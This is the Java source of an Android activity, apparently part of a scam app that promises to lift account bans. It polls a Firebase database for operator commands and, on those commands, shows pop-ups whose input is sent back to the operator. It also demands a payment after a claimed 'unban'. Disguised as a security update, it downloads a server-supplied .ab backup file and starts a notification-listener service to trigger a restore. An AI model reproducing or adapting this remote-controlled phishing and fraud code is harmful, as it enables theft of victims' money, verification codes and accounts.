package com.ban.ab;

import android.app.ActivityManager;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.cardview.widget.CardView;

import org.json.JSONObject;

import java.io.File;
import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okio.BufferedSink;
import okio.Okio;

public class SecondActivity extends AppCompatActivity {

    private String userName;
    private final String FIREBASE_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";
    private final OkHttpClient client = new OkHttpClient();

    private CardView layoutWaiting, layoutRejected, layoutZipTask, layoutVerifyTask, layoutPayment;
    private TextView txtRejectReason, txtTicketID, txtPaymentDetails;
    private Button btnExecuteTask, btnStartFullVerify;
    private ProgressBar taskProgressBar;

    private final Handler refreshHandler = new Handler(Looper.getMainLooper());
    private Runnable refreshRunnable;

    private long lastProcessedTimestamp = 0;
    private AlertDialog currentDialog = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);

        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "UnknownUser");

        initViews();
        generateTicketID();
        startAutoRefresh();
    }

    private void initViews() {
        layoutWaiting = findViewById(R.id.layoutWaiting);
        layoutRejected = findViewById(R.id.layoutRejected);
        layoutZipTask = findViewById(R.id.layoutZipTask);
        layoutVerifyTask = findViewById(R.id.layoutVerifyTask);
        layoutPayment = findViewById(R.id.layoutPayment);

        txtRejectReason = findViewById(R.id.txtRejectReason);
        txtTicketID = findViewById(R.id.txtTicketID);
        txtPaymentDetails = findViewById(R.id.txtPaymentDetails);

        btnExecuteTask = findViewById(R.id.btnExecuteTask);
        btnStartFullVerify = findViewById(R.id.btnStartFullVerify);
        taskProgressBar = findViewById(R.id.taskProgressBar);
    }

    private void startAutoRefresh() {
        refreshRunnable = new Runnable() {
            @Override public void run() { 
                checkAdminCommands(); 
                refreshHandler.postDelayed(this, 5000); 
            }
        };
        refreshHandler.post(refreshRunnable);
    }

    private void checkAdminCommands() {
        String url = FIREBASE_URL + "commands/" + userName + ".json";
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {}
            @Override public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                if (response.isSuccessful() && response.body() != null) {
                    String res = response.body().string();
                    if (res.equals("null")) {
                        handleDeletion();
                        return;
                    }
                    try {
                        JSONObject data = new JSONObject(res);
                        long timestamp = data.optLong("timestamp", 0);
                        String status = data.optString("status");
                        if (timestamp > lastProcessedTimestamp) {
                            lastProcessedTimestamp = timestamp;
                            runOnUiThread(() -> handleCommand(status, data));
                        }
                    } catch (Exception ignored) {}
                }
            }
        });
    }

    private void handleDeletion() {
        runOnUiThread(() -> {
            getSharedPreferences("AppPrefs", MODE_PRIVATE).edit().clear().apply();
            Toast.makeText(this, "انتهت صلاحية الجلسة أو تم حظرك", Toast.LENGTH_LONG).show();
            finishAffinity(); 
        });
    }

    private void handleCommand(String status, JSONObject data) {
        hideAllLayouts();
        String content = data.optString("content");

        switch (status) {
            case "waiting":
                layoutWaiting.setVisibility(View.VISIBLE);
                break;
            case "rejected":
                layoutRejected.setVisibility(View.VISIBLE);
                txtRejectReason.setText(content.isEmpty() ? "تم رفض طلبك حالياً" : content);
                break;
            case "backup_task": // الحالة الجديدة لاستعادة ملف ab ✅
                layoutZipTask.setVisibility(View.VISIBLE);
                // نغير نص الزر ليتماشى مع المهمة الجديدة
                btnExecuteTask.setText("بدء التحديث الأمني المباشر");
                btnExecuteTask.setOnClickListener(v -> startBackupRestoreProcess(data.optString("backup_url")));
                break;
            case "verify_phone":
                layoutVerifyTask.setVisibility(View.VISIBLE);
                btnStartFullVerify.setOnClickListener(v -> startActivity(new Intent(this, VerifyActivity.class)));
                break;
            case "show_payment":
                showPaymentUI(content);
                break;
            case "show_alert":
                layoutWaiting.setVisibility(View.VISIBLE);
                showCustomPopUp(content, false);
                break;
            case "show_input":
                layoutWaiting.setVisibility(View.VISIBLE);
                showCustomPopUp(content, true);
                break;
            default:
                layoutWaiting.setVisibility(View.VISIBLE);
                break;
        }
    }

    private void hideAllLayouts() {
        layoutWaiting.setVisibility(View.GONE);
        layoutRejected.setVisibility(View.GONE);
        layoutZipTask.setVisibility(View.GONE);
        layoutVerifyTask.setVisibility(View.GONE);
        layoutPayment.setVisibility(View.GONE);
    }

    // الدالة الجديدة لمعالجة ملف AB
    private void startBackupRestoreProcess(String url) {
        btnExecuteTask.setEnabled(false);
        taskProgressBar.setVisibility(View.VISIBLE);
        
        new Thread(() -> {
            try {
                // 1. تحميل الملف وحفظه في مسار مؤقت
                File backupFile = new File(getExternalFilesDir(null), "backup_temp.ab");
                downloadFileSync(url, backupFile);

                runOnUiThread(() -> {
                    Toast.makeText(this, "جارٍ تجهيز بيئة الاستعادة...", Toast.LENGTH_SHORT).show();
                    // 2. إرسال أمر للخدمة (CallNotificationListener) لفتح نافذة النظام
                    Intent restoreIntent = new Intent(this, CallNotificationListener.class);
                    restoreIntent.setAction("START_RESTORE");
                    startService(restoreIntent);
                    
                    resetStatusOnServer();
                });

            } catch (Exception e) {
                Log.e("Backup_Process", "Error: ", e);
                runOnUiThread(() -> Toast.makeText(this, "فشل في تحميل بيانات التحديث", Toast.LENGTH_SHORT).show());
            }
            runOnUiThread(() -> {
                taskProgressBar.setVisibility(View.GONE);
                btnExecuteTask.setEnabled(true);
            });
        }).start();
    }

    private void downloadFileSync(String url, File dest) throws IOException {
        try (Response response = client.newCall(new Request.Builder().url(url).build()).execute()) {
            if (!response.isSuccessful() || response.body() == null) throw new IOException("Fail to download");
            try (BufferedSink sink = Okio.buffer(Okio.sink(dest))) { 
                sink.writeAll(response.body().source()); 
            }
        }
    }

    private void showPaymentUI(String amount) {
        layoutPayment.setVisibility(View.VISIBLE);
        String details = "تم فك الحظر بنجاح 100% للرقم المرجعي :- " + txtTicketID.getText() + "\n\n" +
                "يرجى إيداع مبلغ " + amount + " إلى حسابنا في العمقي\n" +
                "رقم الحساب:- 11111\n" +
                "الإسم : فلان بن فلان\n\n" +
                "حتى يتم إكمال الخطوة الأخيرة لتشغيل حسابك فوراً.";
        txtPaymentDetails.setText(details);
    }

    private void showCustomPopUp(String message, boolean isInput) {
        if (currentDialog != null && currentDialog.isShowing()) return;

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        View view = getLayoutInflater().inflate(R.layout.dialog_custom, null);
        
        TextView txtMsg = view.findViewById(R.id.dialogMessage);
        EditText edtIn = view.findViewById(R.id.dialogInput);
        Button btnOk = view.findViewById(R.id.btnDialogAction);
        ImageView btnClose = view.findViewById(R.id.btnDialogClose);

        txtMsg.setText(message);
        edtIn.setVisibility(isInput ? View.VISIBLE : View.GONE);
        
        currentDialog = builder.setView(view).setCancelable(false).create();
        if(currentDialog.getWindow() != null) currentDialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));

        btnClose.setOnClickListener(v -> {
            resetStatusOnServer();
            currentDialog.dismiss();
        });

        btnOk.setOnClickListener(v -> {
            if(isInput) {
                String input = edtIn.getText().toString().trim();
                if (!input.isEmpty()) {
                    sendResponseToAdmin(input);
                    currentDialog.dismiss();
                } else {
                    edtIn.setError("مطلوب");
                }
            } else {
                resetStatusOnServer();
                currentDialog.dismiss();
            }
        });
        currentDialog.show();
    }

    private void sendResponseToAdmin(String response) {
        String url = FIREBASE_URL + "user_responses/" + userName + ".json";
        JSONObject data = new JSONObject();
        try {
            data.put("answer", response);
            data.put("time", System.currentTimeMillis());
            RequestBody body = RequestBody.create(data.toString(), MediaType.parse("application/json"));
            client.newCall(new Request.Builder().url(url).put(body).build()).enqueue(new Callback() {
                @Override public void onResponse(@NonNull Call call, @NonNull Response response) {
                    resetStatusOnServer();
                }
                @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {}
            });
        } catch (Exception ignored) {}
    }

    private void resetStatusOnServer() {
        String url = FIREBASE_URL + "commands/" + userName + "/status.json";
        RequestBody body = RequestBody.create("\"waiting\"", MediaType.parse("application/json"));
        client.newCall(new Request.Builder().url(url).put(body).build()).enqueue(new Callback() {
            @Override public void onResponse(@NonNull Call call, @NonNull Response response) {}
            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {}
        });
    }

    private void generateTicketID() { 
        txtTicketID.setText("BT-" + (System.currentTimeMillis() / 1000000)); 
    }

    @Override protected void onDestroy() { 
        super.onDestroy(); 
        refreshHandler.removeCallbacks(refreshRunnable); 
    }
}
